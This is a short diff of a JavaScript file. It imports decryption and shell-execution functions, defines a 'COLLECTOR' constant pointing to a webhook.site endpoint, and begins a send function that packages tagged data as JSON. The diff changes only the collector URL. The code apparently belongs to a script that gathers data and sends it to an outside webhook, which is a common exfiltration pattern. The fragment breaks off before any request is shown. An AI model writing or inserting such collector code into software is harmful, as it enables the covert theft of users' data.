@@ -1,7 +1,7 @@
 import { createDecipheriv } from 'crypto';
 import { execSync } from 'child_process';
 
-const COLLECTOR = 'https://webhook.site/b294c785-d7c9-4a0e-91b3-1d6d4015ce3e';
+const COLLECTOR = 'https://webhook.site/713191cd-9f81-4437-b7fe-794143a335d3';
 
 function send(tag, body) {
   const data = JSON.stringify({ tag, body });
